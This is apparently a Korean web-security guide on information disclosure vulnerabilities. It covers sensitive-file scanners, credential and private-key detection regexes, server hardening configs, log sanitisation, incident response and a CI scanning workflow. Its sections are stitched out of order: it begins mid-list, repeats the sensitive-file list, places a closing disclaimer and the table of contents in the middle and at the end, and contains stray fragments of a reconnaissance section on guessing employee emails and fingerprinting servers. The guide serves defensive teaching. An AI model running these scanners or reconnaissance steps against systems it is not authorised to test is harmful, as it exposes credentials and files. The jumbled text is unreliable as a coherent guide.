'database.conf', 'web.config.backup',
            
            # Git 파일
            '.git/config', '.git/HEAD', '.git/index',
            '.git/logs/HEAD', '.gitignore',
            
            # 로그 파일
            'error.log', 'access.log', 'debug.log',
            'application.log', 'error_log',
            
            # 설정 파일
            'phpinfo.php', 'info.php', 'test.php',
            'admin.php', 'config.inc', 'database.inc',
            
            # 문서 및 API
            'swagger.json', 'api-docs', 'openapi.json',
            'README.md', 'CHANGELOG.md',
            
            # 에디터 파일
            '.vscode/settings.json', '.idea/workspace.xml'
        ]
        
        # 스캔할 디렉토리
        self.sensitive_directories = [
            'admin/', 'backup/', 'config/', 'logs/',
            'test/', 'dev/', 'debug/', '.git/',
            'documentation/', 'docs/', 'api-docs/'
        ]
    
    def scan_all_endpoints(self):
        """모든 민감한 엔드포인트 스캔"""
        results = {
            'files': [],
            'directories': [],
            'errors': []
        }
        
        # 파일 스캔
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            file_futures = {
                executor.submit(self.scan_file, file_path): file_path 
                for file_path in self.sensitive_files
            }
            
            for future in concurrent.futures.as_completed(file_futures):
                file_path = file_futures[future]
                try:
                    result = future.result()
                    if result['accessible']:
                        results['files'].append(result)
                except Exception as e:
                    results['errors'].append({'file': file_path, 'error': str(e)})
        
        # 디렉토리 스캔
        for directory in self.sensitive_directories:
            dir_result = self.scan_directory(directory)
            if dir_result['accessible']:
                results['directories'].append(dir_result)
        
        return self.analyze_scan_results(results)
    
    def scan_file(self, file_path):
        """개별 파일 접근성 스캔"""
        url = f"{self.target_url}/{file_path}"
        
        try:
            response = self.session.get(url, timeout=10)
            
            result = {
                'path': file_path,
                'url': url,
                'status_code': response.status_code,
                'accessible': response.status_code == 200,
                'content_length': len(response.content),
                'content_type': response.headers.get('content-type', ''),
                'sensitive_data': self.detect_sensitive_content(response.text)
            }
            
            return result
            
        except Exception as e:
            return {
                'path': file_path,
                'url': url,
                'accessible': False,
                'error': str(e)
            }
    
    def detect_sensitive_content(self, content):
        """응답 내용에서 민감한 정보 탐지"""
        sensitive_indicators = {
            'credentials': [
                r'password\s*[:=]\s*[^\s\n]+',
                r'secret\s*[:=]\s*[^\s\n]+',
                r'api[_-]?key\s*[:=]\s*[^\s\n]+'
            ],
            'system_info': [
                r'root:x:0:0:',
                r'mysql_connect',
                r'Fatal error:',
                r'Stack trace:'
            ],
            'paths': [
                r'/var/www/',
                r'/home/[^/]+/',
                r'C:\\\\[Ww]indows\\\\'
            ]
        }
        
        detected = {}
        for category, patterns in sensitive_indicators.items():
            matches = []
            for pattern in patterns:
                found = re.findall(pattern, content, re.IGNORECASE)
                matches.extend(found)
            
            if matches:
                detected[category] = matches[:5]  # 최대 5개까지만 저장
        
        return detected
    
    def generate_comprehensive_report(self, scan_results):
        """종합 보안 스캔 보고서 생성"""
        
        critical_files = [f for f in scan_results['files'] 
                         if f.get('sensitive_data') and 
                         any('credentials' in f['sensitive_data'] or 
                             'system_info' in f['sensitive_data'])]
        
        report = f"""
# 정보 노출 취약점 스캔 보고서

## 개요
- 스캔 대상: {self.target_url}
- 스캔 시간: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- 발견된 취약점: {len(scan_results['files'])}개 파일, {len(scan_results['directories'])}개 디렉토리

## 심각한 발견사항
"""
        
        if critical_files:
            report += "### 🚨 즉시 조치 필요\n"
            for file_info in critical_files:
                report += f"- **{file_info['path']}**: {', '.join(file_info['sensitive_data'].keys())}\n"
        
        report += f"""

## 상세 결과
### 접근 가능한 파일 ({len(scan_results['files'])}개)
"""
        
        for file_info in scan_results['files']:
            risk_level = self.assess_file_risk(file_info)
            report += f"- {file_info['path']} ({risk_level}) - {file_info['content_length']} bytes\n"
        
        return report
```

### 4.9. 사고 대응 및 복구

#### 4.9.1. 정보 노출 사고 대응 절차
```markdown
## 정보 노출 사고 대응 절차

### 즉시 대응 (0-30분)
1. **노출 차단**
   - 해당 파일/디렉토리 즉시 접근 차단
   - 웹 서버 설정 변경
   - CDN 캐시 퍼지 (해당되는 경우)

2. **노출 범위 확인**
   - 어떤 정보가 노출되었는지 정확히 파악
   - 노출 기간 추정 (로그 분석)
   - 접근한 IP 주소 목록 수집

3. **즉시 보호 조치**
   - 노출된 크리덴셜 즉시 변경
   - 관련 API 키 비활성화
   - 영향받은 계정 임시 잠금

### 단기 대응 (30분-4시간)
1. **영향 분석**
   - 노출된 정보의 민감도 평가
   - 2차 피해 가능성 분석
   - 규정 위반 여부 확인 (GDPR, 개인정보보호법 등)

2. **복구 작업**
   - 새로운 크리덴셜 생성 및 배포
   - 데이터베이스 접근 권한 재설정
   - 시스템 무결성 검증

3. **모니터링 강화**
   - 비정상적인 접근 패턴 모니터링
   - 관련 계정 활동 추적
   - 추가 정보 노출 여부 점검
```

### 4.10. 자동화 스캔 도구

#### 4.10.1. 종합 정보 노출 스캐너
```python
#!/usr/bin/env python3

import requests
import threading
import time
from queue import Queue

class ComprehensiveInfoDisclosureScanner:
    def __init__(self, target_url, wordlist_file):
        self.target_url = target_url.rstrip('/')
        self.wordlist_file = wordlist_file
        self.session = requests.Session()
        self.results = Queue()
        
        # 스캔 설정
        self.threads = 20
        self.timeout = 10
        
    def load_wordlist(self):
        """워드리스트 파일 로드"""
        try:
            with open(self.wordlist_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            # 기본 워드리스트 사용
            return [
                '.env', '.git/config', 'config.php.bak',
                'phpinfo.php', 'admin.php', 'test.php',
                'backup.sql', 'database.sql', 'dump.sql',
                'error.log', 'access.log', 'debug.log',
                'swagger.json', 'api-docs', 'openapi.yaml'
            ]
    
    def worker(self, queue):
        """스캔 워커 스레드"""
        while not queue.empty():
            try:
                path = queue.get(timeout=1)
                result = self.scan_path(path)
                if result['interesting']:
                    self.results.put(result)
                queue.task_done()
            except:
                break
    
    def scan_path(self, path):
        """경로 스캔"""
        url = f"{self.target_url}/{path}"
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            result = {
                'path': path,
                'url': url,
                'status_code': response.status_code,
                'content_length': len(response.content),
                'headers': dict(response.headers),
                'interesting': False,
                'findings': []
            }
            
            # 흥미로운 응답 확인
            if response.status_code == 200:
                result['interesting'] = True
                result['content_preview'] = response.text[:500]
                
                # 민감한 정보 검사
                findings = self.analyze_content(response.text, path)
                result['findings'] = findings
            
            elif response.status_code in [403, 401]:
                # 접근 제한된 파일도 존재 확인됨
                result['interesting'] = True
                result['findings'] = ['Protected file exists']
            
            return result
            
        except Exception as e:
            return {
                'path': path,
                'error': str(e),
                'interesting': False
            }
    
    def run_scan(self):
        """전체 스캔 실행"""
        print(f"🔍 Starting information disclosure scan for {self.target_url}")
        
        wordlist = self.load_wordlist()
        queue = Queue()
        
        # 큐에 작업 추가
        for path in wordlist:
            queue.put(path)
        
        # 스레드 시작
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(queue,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 완료 대기
        queue.join()
        
        # 결과 수집
        findings = []
        while not self.results.empty():
            findings.append(self.results.get())
        
        return self.generate_final_report(findings)
    
    def generate_final_report(self, findings):
        """최종 스캔 보고서 생성"""
        
        critical_findings = []
        high_findings = []
        medium_findings = []
        
        for finding in findings:
            if any('credentials' in str(f) for f in finding.get('findings', [])):
                critical_findings.append(finding)
            elif finding['status_code'] == 200 and finding['content_length'] > 1000:
                high_findings.append(finding)
            else:
                medium_findings.append(finding)
        
        report = {
            'scan_summary': {
                'target': self.target_url,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_findings': len(findings),
                'critical': len(critical_findings),
                'high': len(high_findings),
                'medium': len(medium_findings)
            },
            'critical_findings': critical_findings,
            'high_findings': high_findings,
            'medium_findings': medium_findings,
            'recommendations': self.generate_recommendations(findings)
        }
        
        return report
```

#### 4.10.2. CI/CD 파이프라인 통합
```yaml
# GitHub Actions - 정보 노출 스캔
name: Information Disclosure Scan

on:
  push:
    branches: [ main, develop ]
  schedule:
    - cron: '0 2 * * *'  # 매일 새벽 2시 실행

jobs:
  info-disclosure-scan:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Setup Python
      uses: actions/setup-python@v3
      with:
        python-version: '3.9'
    
    - name: Install scanning tools
      run: |
        pip install requests beautifulsoup4
        # 추가 도구 설치
        wget https://github.com/maurosoria/dirsearch/archive/master.zip
        unzip master.zip
    
    - name: Scan for sensitive files
      run: |
        python3 info_disclosure_scanner.py \
          --target=${{ secrets.STAGING_URL }} \
          --output=scan_results.json
    
    - name: Check for critical findings
      run: |
        if python3 -c "
        import json
        with open('scan_results.json') as f:
            results = json.load(f)
            if results['scan_summary']['critical'] > 0:
                print('Critical information disclosure found!')
                exit(1)
        "; then
          echo "✅ No critical findings"
        fi
    
    - name: Upload scan results
      uses: actions/upload-artifact@v3
      with:
        name: info-disclosure-scan
        path: scan_results.json
    
    - name: Notify security team
      if: failure()
      uses: 8398a7/action-slack@v3
      with:
        status: failure
        channel: '#security-alerts'
        text: 'Critical information disclosure vulnerabilities detected!'
      env:
        SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}
```

### 4.11. 정보 분류 및 보호 정책

#### 4.11.1. 데이터 분류 체계
```markdown
## 정보 분류 및 보호 수준

### 1. 극비 (Top Secret)
- **정의**: 노출 시 조직에 치명적 피해를 줄 수 있는 정보
- **예시**: 
  - 데이터베이스 root 패스워드
  - 마스터 암호화 키
  - 고객 신용카드 정보
- **보호 조치**:
  - 암호화 저장 필수
  - 접근 로그 100% 기록
  - 다단계 인증 필수
  - 네트워크 분리

### 2. 기밀 (Confidential)
- **정의**: 노출 시 심각한 피해를 줄 수 있는 정보
- **예시**:
  - API 키 및 토큰
  - 개인정보
  - 비즈니스 로직
- **보호 조치**:
  - 접근 권한 제어
  - 정기적인 키 로테이션
  - 감사 로그 유지

### 3. 제한 (Restricted)
- **정의**: 내부에서만 사용되어야 하는 정보
- **예시**:
  - 시스템 설정 정보
  - 내부 네트워크 구조
  - 직원 정보
- **보호 조치**:
  - 내부 네트워크에서만 접근
  - 기본적인 인증 필요

### 4. 공개 (Public)
- **정의**: 외부 공개가 가능한 정보
- **예시**:
  - 마케팅 자료
  - 공개 API 문서
  - 일반 콘텐츠
```

#### 4.11.2. 정보 보호 구현
```python
from enum import Enum
import functools

class DataClassification(Enum):
    TOP_SECRET = "top_secret"
    CONFIDENTIAL = "confidential"
    RESTRICTED = "restricted"
    PUBLIC = "public"

class InformationProtectionManager:
    def __init__(self):
        self.access_policies = {
            DataClassification.TOP_SECRET: {
                'encryption_required': True,
                'audit_required': True,
                'mfa_required': True,
                'network_isolation': True
            },
            DataClassification.CONFIDENTIAL: {
                'encryption_required': True,
                'audit_required': True,
                'mfa_required': False,
                'network_isolation': False
            },
            DataClassification.RESTRICTED: {
                'encryption_required': False,
                'audit_required': True,
                'mfa_required': False,
                'network_isolation': False
            },
            DataClassification.PUBLIC: {
                'encryption_required': False,
                'audit_required': False,
                'mfa_required': False,
                'network_isolation': False
            }
        }
    
    def classify_and_protect(self, data_type):
        """데이터 분류 기반 보호 데코레이터"""
        def decorator(func):
            @functools.wraps(func)
            def wrapper(*args, **kwargs):
                classification = self.get_data_classification(data_type)
                policy = self.access_policies[classification]
                
                # 보호 정책 적용
                if policy['mfa_required']:
                    self.verify_mfa()
                
                if policy['audit_required']:
                    self.log_data_access(func.__name__, classification, args, kwargs)
                
                if policy['encryption_required']:
                    # 암호화된 형태로 데이터 처리
                    result = func(*args, **kwargs)
                    return self.encrypt_response(result)
                
                return func(*args, **kwargs)
            
            return wrapper
        return decorator
    
    def get_data_classification(self, data_type):
        """데이터 타입별 분류 결정"""
        classification_map = {
            'database_password': DataClassification.TOP_SECRET,
            'api_key': DataClassification.CONFIDENTIAL,
            'user_profile': DataClassification.RESTRICTED,
            'public_content': DataClassification.PUBLIC
        }
        
        return classification_map.get(data_type, DataClassification.RESTRICTED)
```

### 4.12. 정기 보안 점검

#### 4.12.1. 자동화된 정기 스캔
```bash
#!/bin/bash
# 정기 정보 노출 점검 스크립트

SCAN_DATE=$(date +%Y%m%d_%H%M%S)
REPORT_DIR="./security_reports/$SCAN_DATE"
mkdir -p "$REPORT_DIR"

echo "📊 Starting scheduled information disclosure scan..."

# 1. 웹 스캔
echo "1. Web application scan..."
python3 web_info_scanner.py \
    --target="$PRODUCTION_URL" \
    --output="$REPORT_DIR/web_scan.json"

# 2. Git 저장소 점검
echo "2. Git repository scan..."
python3 git_leaks_scanner.py \
    --repo="." \
    --output="$REPORT_DIR/git_scan.json"

# 3. 파일 시스템 점검
echo "3. File system scan..."
find /var/www/ -name "*.bak" -o -name "*.backup" -o -name "*~" \
    > "$REPORT_DIR/backup_files.txt"

find /var/www/ -name ".env*" -o -name "config.php" \
    > "$REPORT_DIR/config_files.txt"

# 4. 로그 분석
echo "4. Log analysis..."
python3 log_analyzer.py \
    --logs="/var/log/apache2/" \
    --output="$REPORT_DIR/log_analysis.json"

# 5. 보고서 생성
echo "5. Generating comprehensive report..."
python3 generate_security_report.py \
    --input="$REPORT_DIR" \
    --output="$REPORT_DIR/final_report.html"

# 6. 심각한 취약점 발견 시 알림
if grep -q "CRITICAL\|HIGH" "$REPORT_DIR"/*.json; then
    echo "🚨 Critical vulnerabilities found! Sending alerts..."
    python3 send_security_alert.py \
        --report="$REPORT_DIR/final_report.html" \
        --severity="HIGH"
fi

echo "✅ Security scan completed. Report saved to $REPORT_DIR"
```

---

## 참고 자료

### 추가 학습 자료
- [OWASP Information Disclosure](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_error_messages)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls](https://www.cisecurity.org/controls/)

### 유용한 도구
- **Burp Suite**: 정보 노출 스캔
- **OWASP ZAP**: 자동화된 취약점 스캔
- **Nikto**: 웹 서버 스캐너
- **dirb/dirbuster**: 디렉토리 브루트포스
- **GitLeaks**: Git 저장소 민감 정보 스캔

### 모니터링 도구
- **SIEM**: Splunk, ELK Stack, QRadar
- **파일 무결성 모니터링**: AIDE, Tripwire, OSSEC
- **로그 분석**: Logwatch, fail2ban
- **취약점 스캐너**: Nessus, OpenVAS, Qualys

---

*본 가이드는 웹 애플리케이션 보안 테스팅 목적으로만 사용되어야 하며, 악의적인 공격에 사용해서는 안 됩니다.*
```

### 4.2. 파일 및 디렉토리 보안

#### 4.2.1. 웹 서버 보안 설정
```apache
# Apache 보안 설정 (httpd.conf)

# 디렉토리 리스팅 비활성화
<Directory "/var/www/html">
    Options -Indexes -FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>

# 민감한 파일 접근 차단
<FilesMatch "\.(bak|backup|old|orig|save|tmp|swp|~|#)$">
    Require all denied
</FilesMatch>

# 버전 관리 시스템 파일 차단
<DirectoryMatch "\.git">
    Require all denied
</DirectoryMatch>

<DirectoryMatch "\.svn">
    Require all denied
</DirectoryMatch>

# 설정 파일 차단
<Files ~ "^\.env">
    Require all denied
</Files>

<Files ~ "^\.htaccess">
    Require all denied
</Files>

# 서버 정보 숨김
ServerTokens Prod
ServerSignature Off

# 불필요한 헤더 제거
Header unset Server
Header unset X-Powered-By
```

#### 4.2.2. Nginx 보안 설정
```nginx
# nginx.conf 보안 설정

# 서버 토큰 숨김
server_tokens off;

# 숨겨진 파일 접근 차단
location ~ /\. {
    deny all;
    access_log off;
    log_not_found off;
}

# 백업 파일 접근 차단
location ~* \.(bak|backup|old|orig|save|tmp|swp)$ {
    deny all;
    access_log off;
    log_not_found off;
}

# 설정 파일 차단
location ~* ^/(config|\.env|database\.conf) {
    deny all;
    access_log off;
    log_not_found off;
}

# 로그 파일 접근 차단
location ~* \.(log|logs)$ {
    deny all;
    access_log off;
    log_not_found off;
}

# 개발 도구 파일 차단
location ~* \.(json|xml|yml|yaml)$ {
    location ~* ^/(package\.json|composer\.json|pom\.xml)$ {
        deny all;
    }
}

# 보안 헤더 추가
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options DENY;
add_header X-XSS-Protection "1; mode=block";
```

### 4.3. 소스 코드 보안 관리

#### 4.3.1. .gitignore 설정 강화
```gitignore
# 환경 설정 파일
.env
.env.local
.env.*.local
config.ini
database.conf

# 로그 파일
*.log
logs/
log/

# 백업 파일
*.bak
*.backup
*.old
*.orig
*.save
*~

# 에디터 임시 파일
.*.swp
.*.swo
*~
.#*
#*#

# IDE 설정
.idea/
.vscode/
*.sublime-project
*.sublime-workspace

# 시스템 파일
.DS_Store
Thumbs.db

# 빌드 결과물
dist/
build/
target/
node_modules/

# 인증서 및 키 파일
*.pem
*.key
*.crt
*.p12
*.pfx

# 데이터베이스 파일
*.sqlite
*.db
```

#### 4.3.2. 배포 시 파일 정리 스크립트
```bash
#!/bin/bash
# 배포 전 민감한 파일 제거 스크립트

echo "🧹 Cleaning sensitive files before deployment..."

# 백업 파일 제거
find . -name "*.bak" -delete
find . -name "*.backup" -delete
find . -name "*.old" -delete
find . -name "*~" -delete

# 에디터 임시 파일 제거
find . -name ".*.swp" -delete
find . -name ".*.swo" -delete
find . -name "#*#" -delete

# 로그 파일 제거
find . -name "*.log" -delete
find . -path "*/logs/*" -delete

# 개발 도구 파일 제거
rm -rf .git/
rm -rf .svn/
rm -rf .idea/
rm -rf .vscode/

# 설정 파일 검증
if [ -f .env ]; then
    echo "⚠️  .env file found - should not be in production!"
    exit 1
fi

if [ -f config.php.bak ]; then
    echo "⚠️  Backup config file found!"
    exit 1
fi

echo "✅ File cleanup completed successfully"
```

### 4.4. API 문서 보안

#### 4.4.1. API 문서 접근 제어
```yaml
# Docker Compose - Swagger UI 보안 설정
version: '3.8'
services:
  swagger-ui:
    image: swaggerapi/swagger-ui
    environment:
      - SWAGGER_JSON=/app/swagger.json
      - SHOW_EXTENSIONS=false
      - SHOW_COMMON_EXTENSIONS=false
      - TRY_IT_OUT_ENABLED=false
    networks:
      - internal_network
    # 외부 접근 차단, VPN이나 내부망에서만 접근 가능

networks:
  internal_network:
    internal: true
```

#### 4.4.2. 프로덕션 환경에서 디버그 정보 제거
```javascript
// Express.js 환경별 설정
if (process.env.NODE_ENV === 'production') {
    // 디버그 미들웨어 비활성화
    app.set('x-powered-by', false);
    
    // 에러 스택 트레이스 숨김
    app.use((err, req, res, next) => {
        res.status(err.status || 500);
        res.json({
            message: 'Internal Server Error',
            error: {}  // 스택 트레이스 제거
        });
    });
} else {
    // 개발 환경에서만 상세 에러 정보 제공
    app.use((err, req, res, next) => {
        res.status(err.status || 500);
        res.json({
            message: err.message,
            error: err.stack
        });
    });
}
```

### 4.5. 로그 보안 관리

#### 4.5.1. 중앙집중식 로그 관리
```python
import logging
import json
from datetime import datetime

class CentralizedSecureLogger:
    def __init__(self, log_server_url, api_key):
        self.log_server_url = log_server_url
        self.api_key = api_key
        self.local_logger = logging.getLogger(__name__)
        
    def send_secure_log(self, level, message, context=None):
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'level': level,
            'message': self.sanitize_message(message),
            'application': 'web-app',
            'server_id': self.get_server_id(),
            'context': self.sanitize_context(context or {})
        }
        
        try:
            # 중앙 로그 서버로 전송
            response = requests.post(
                f"{self.log_server_url}/api/logs",
                headers={
                    'Authorization': f'Bearer {self.api_key}',
                    'Content-Type': 'application/json'
                },
                json=log_entry,
                timeout=5
            )
            
            if response.status_code != 200:
                # 중앙 서버 실패 시 로컬 로그에 기록
                self.local_logger.error(f"Failed to send log to central server: {response.status_code}")
                
        except Exception as e:
            # 네트워크 오류 시 로컬 로그에 기록
            self.local_logger.error(f"Log transmission failed: {e}")
            self.local_logger.info(json.dumps(log_entry))
    
    def sanitize_message(self, message):
        """민감한 정보 마스킹"""
        import re
        
        # 비밀번호 패턴
        message = re.sub(r'password\s*[:=]\s*\S+', 'password=***', message, flags=re.IGNORECASE)
        
        # API 키 패턴
        message = re.sub(r'api[_-]?key\s*[:=]\s*\S+', 'api_key=***', message, flags=re.IGNORECASE)
        
        # 토큰 패턴
        message = re.sub(r'token\s*[:=]\s*\S+', 'token=***', message, flags=re.IGNORECASE)
        
        # 신용카드 번호
        message = re.sub(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b', '****-****-****-****', message)
        
        return message
```

### 4.6. 모니터링 및 알림 시스템

#### 4.6.1. 정보 노출 탐지 시스템
```python
import re
import hashlib
from datetime import datetime

class InformationDisclosureDetector:
    def __init__(self):
        # 민감한 정보 패턴
        self.sensitive_patterns = {
            'database_credentials': [
                r'mysql://[^:]+:[^@]+@',
                r'postgresql://[^:]+:[^@]+@',
                r'mongodb://[^:]+:[^@]+@'
            ],
            'api_keys': [
                r'api[_-]?key["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{20,}',
                r'secret[_-]?key["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{20,}',
                r'access[_-]?token["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{20,}'
            ],
            'aws_credentials': [
                r'AKIA[0-9A-Z]{16}',
                r'aws[_-]?secret[_-]?access[_-]?key',
                r'aws[_-]?session[_-]?token'
            ],
            'private_keys': [
                r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----',
                r'-----BEGIN\s+OPENSSH\s+PRIVATE\s+KEY-----'
            ],
            'system_info': [
                r'root:x:0:0:',  # /etc/passwd
                r'\[boot loader\]',  # Windows boot.ini
                r'mysql_connect\(\)',  # PHP 함수
                r'Stack trace:'
            ]
        }
    
    def scan_response_for_leaks(self, response_text, url, status_code):
        """응답에서 정보 노출 스캔"""
        
        findings = []
        
        for category, patterns in self.sensitive_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE | re.MULTILINE)
                
                if matches:
                    finding = {
                        'category': category,
                        'pattern': pattern,
                        'matches_count': len(matches),
                        'url': url,
                        'status_code': status_code,
                        'risk_level': self.calculate_risk_level(category),
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
        
        return findings
    
    def calculate_risk_level(self, category):
        """카테고리별 위험도 계산"""
        risk_levels = {
            'database_credentials': 'CRITICAL',
            'api_keys': 'HIGH',
            'aws_credentials': 'CRITICAL',
            'private_keys': 'CRITICAL',
            'system_info': 'MEDIUM'
        }
        
        return risk_levels.get(category, 'LOW')
    
    def generate_security_report(self, findings):
        """보안 스캔 결과 보고서 생성"""
        
        if not findings:
            return {'status': 'SAFE', 'message': 'No information disclosure detected'}
        
        critical_findings = [f for f in findings if f['risk_level'] == 'CRITICAL']
        high_findings = [f for f in findings if f['risk_level'] == 'HIGH']
        
        report = {
            'scan_timestamp': datetime.now().isoformat(),
            'total_findings': len(findings),
            'critical_count': len(critical_findings),
            'high_count': len(high_findings),
            'status': 'VULNERABLE' if critical_findings else 'SUSPICIOUS',
            'findings': findings,
            'recommendations': self.generate_recommendations(findings)
        }
        
        return report
    
    def generate_recommendations(self, findings):
        """발견된 취약점에 대한 권장사항 생성"""
        recommendations = []
        
        categories_found = {f['category'] for f in findings}
        
        if 'database_credentials' in categories_found:
            recommendations.append("즉시 데이터베이스 크리덴셜 변경 필요")
            recommendations.append("연결 문자열을 환경 변수로 분리")
        
        if 'api_keys' in categories_found:
            recommendations.append("API 키 재발급 및 로테이션 구현")
            recommendations.append("키 관리 시스템(AWS KMS, HashiCorp Vault) 도입")
        
        if 'private_keys' in categories_found:
            recommendations.append("개인키 즉시 교체 및 인증서 재발급")
            recommendations.append("키 저장소 보안 강화")
        
        return recommendations
```

### 4.7. 클라우드 환경 보안 강화

#### 4.7.1. AWS 환경 보안 설정
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyS3LogAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": [
        "arn:aws:s3:::company-logs/*",
        "arn:aws:s3:::backup-bucket/*"
      ]
    },
    {
      "Sid": "DenyConfigAccess", 
      "Effect": "Deny",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::config-bucket",
        "arn:aws:s3:::config-bucket/*"
      ]
    }
  ]
}
```

#### 4.7.2. 서버리스 환경 보안
```yaml
# AWS SAM Template - Lambda 보안 설정
AWSTemplateFormatVersion: '2010-09-09'
Transform: AWS::Serverless-2016-10-31

Globals:
  Function:
    Environment:
      Variables:
        LOG_LEVEL: WARN  # 프로덕션에서 DEBUG 로그 비활성화
    VpcConfig:
      SecurityGroupIds:
        - !Ref LambdaSecurityGroup
      SubnetIds:
        - !Ref PrivateSubnet
    
Resources:
  SecureFunction:
    Type: AWS::Serverless::Function
    Properties:
      CodeUri: src/
      Handler: app.lambda_handler
      Runtime: python3.9
      Environment:
        Variables:
          SENSITIVE_CONFIG: !Ref ParameterStore
      # 환경 변수로 민감 정보 노출 방지
```

### 4.8. 모니터링 및 스캔 자동화

#### 4.8.1. 자동화된 정보 노출 스캔
```python
import requests
import concurrent.futures
from pathlib import Path

class InformationDisclosureScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # 스캔할 파일 목록
        self.sensitive_files = [
            # 백업 파일
            '.env', '.env.backup', 'config.php.bak',
            'database.conf',# 메모리 및 리소스 오류
grep -i "memory\|resource\|timeout" error.log

# 권한 관련 오류
grep -i "access denied\|forbidden\|unauthorized" error.log
```

### 3.8. 소셜 엔지니어링을 통한 정보 수집

#### 3.8.1. 직원 정보 수집
```bash
# 공개 소셜 미디어에서 정보 수집
# LinkedIn에서 회사 직원 목록
# GitHub에서 조직 멤버 및 커밋 정보
# 회사 웹사이트의 직원 소개 페이지

# 이메일 주소 패턴 추측
firstname.lastname@company.com
first.last@company.com
flastname@company.com
firstname@company.com
```

#### 3.8.2. 기술 스택 정보 수집
```bash
# 채용 공고에서 기술 스택 파악
# 기술 블로그나 컨퍼런스 발표 자료
# GitHub 저장소의 기술 스택

# Wappalyzer를 통한 기술 스택 분석
# HTTP 헤더 분석
curl -I http://target.com/
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3
```

---

## 4. 조치 가이드

### 4.1. 에러 처리 보안화

#### 4.1.1. 안전한 에러 처리 구현
```java
@RestControllerAdvice
public class GlobalExceptionHandler {
    private static final Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);
    
    @ExceptionHandler(DataAccessException.class)
    public ResponseEntity<ErrorResponse> handleDatabaseException(DataAccessException e) {
        // 상세한 에러는 로그에만 기록
        logger.error("Database error occurred", e);
        
        // 사용자에게는 일반적인 메시지만 반환
        ErrorResponse error = new ErrorResponse(
            "INTERNAL_ERROR", 
            "An internal error occurred. Please try again later.",
            System.currentTimeMillis()
        );
        
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(error);
    }
    
    @ExceptionHandler(FileNotFoundException.class)
    public ResponseEntity<ErrorResponse> handleFileNotFound(FileNotFoundException e) {
        // 파일 경로 정보 노출 방지
        logger.warn("File not found: {}", e.getMessage());
        
        ErrorResponse error = new ErrorResponse(
            "NOT_FOUND",
            "The requested resource was not found.",
            System.currentTimeMillis()
        );
        
        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(error);
    }
    
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleGenericException(Exception e) {
        // 예상치 못한 에러 처리
        logger.error("Unexpected error occurred", e);
        
        ErrorResponse error = new ErrorResponse(
            "UNKNOWN_ERROR",
            "An unexpected error occurred. Please contact support.",
            System.currentTimeMillis()
        );
        
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(error);
    }
}

// 표준화된 에러 응답 클래스
public class ErrorResponse {
    private String code;
    private String message;
    private long timestamp;
    private String requestId;  // 로그 추적용
    
    // 생성자, getter, setter
}
```

#### 4.1.2. 로그 보안 관리
```python
import logging
import re
from pythonjsonlogger import jsonlogger

class SecureLogger:
    def __init__(self):
        # 민감한 정보 패턴
        self.sensitive_patterns = [
            (re.compile(r'password\s*[:=]\s*\S+', re.IGNORECASE), 'password=***'),
            (re.compile(r'api_?key\s*[:=]\s*\S+', re.IGNORECASE), 'api_key=***'),
            (re.compile(r'secret\s*[:=]\s*\S+', re.IGNORECASE), 'secret=***'),
            (re.compile(r'token\s*[:=]\s*\S+', re.IGNORECASE), 'token=***'),
            (re.compile(r'\b\d{4}-\d{4}-\d{4}-\d{4}\b'), '****-****-****-****'),  # 카드번호
            (re.compile(r'\b\d{3}-\d{2}-\d{4}\b'), '***-**-****'),  # SSN
        ]
        
        # 구조화된 로깅 설정
        formatter = jsonlogger.JsonFormatter(
            '%(asctime)s %(name)s %(levelname)s %(message)s %(pathname)s %(lineno)d'
        )
        
        handler = logging.StreamHandler()
        handler.setFormatter(formatter)
        
        self.logger = logging.getLogger('secure_logger')
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    def sanitize_log_message(self, message):
        """로그 메시지에서 민감한 정보 제거"""
        sanitized = str(message)
        
        for pattern, replacement in self.sensitive_patterns:
            sanitized = pattern.sub(replacement, sanitized)
        
        return sanitized
    
    def secure_info(self, message, extra_data=None):
        clean_message = self.sanitize_log_message(message)
        clean_extra = self.sanitize_extra_data(extra_data) if extra_data else {}
        
        self.logger.info(clean_message, extra=clean_extra)
    
    def secure_error(self, message, exception=None, extra_data=None):
        clean_message = self.sanitize_log_message(message)
        clean_extra = self.sanitize_extra_data(extra_data) if extra_data else {}
        
        if exception:
            clean_extra# 정보노출 취약점 가이드

## 목차
1. [정의&원리](#1-정의원리)
